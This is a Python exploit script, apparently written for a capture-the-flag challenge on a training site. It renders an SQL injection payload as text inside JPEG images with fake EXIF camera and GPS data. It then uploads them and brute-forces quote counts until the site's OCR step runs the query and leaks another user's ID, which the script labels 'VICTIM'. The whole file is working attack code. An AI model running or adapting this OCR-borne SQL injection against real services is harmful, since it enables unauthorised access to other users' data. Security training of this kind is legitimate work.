# sweep_final.py — calibrate quote count ON THE REAL PAYLOAD. Vary opening/closing quote
# counts 1..4 each; find the combo that returns 200 AND executes (summary_ocr becomes a uuid).
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
q = chr(39)
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def build(text, path, size=32):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

SUB = "||(SELECT user_id FROM images WHERE id=1)||"
found = None
for a in range(1,5):
    for b in range(1,5):
        payload = q*a + SUB + q*b
        uri = build(payload, "sw.jpg")
        r = requests.post(f"{BASE}/upload", json={"image":uri,"description":f"SF_{a}_{b}","user_id":UID})
        sc = r.status_code
        info = f"a={a} b={b} -> {sc}"
        if sc == 200:
            # read back this row
            data = requests.get(f"{BASE}/images/{UID}").json()
            row = next((x for x in data if x.get("description")==f"SF_{a}_{b}"), None)
            ocr = row.get("summary_ocr","") if row else ""
            leak = [u for u in UURE.findall(str(ocr)) if u != UID]
            info += f"  ocr={ocr!r}"
            if leak:
                info += f"   >>> VICTIM {leak}"
                found = leak[0]
        print(info)
        if found: break
    if found: break

if found:
    print("\n=========================================")
    print("VICTIM user_id:", found)
    print("Next: GET /images/%s" % found)
    print("=========================================")
else:
    print("\nno execution yet across a,b in 1..4")
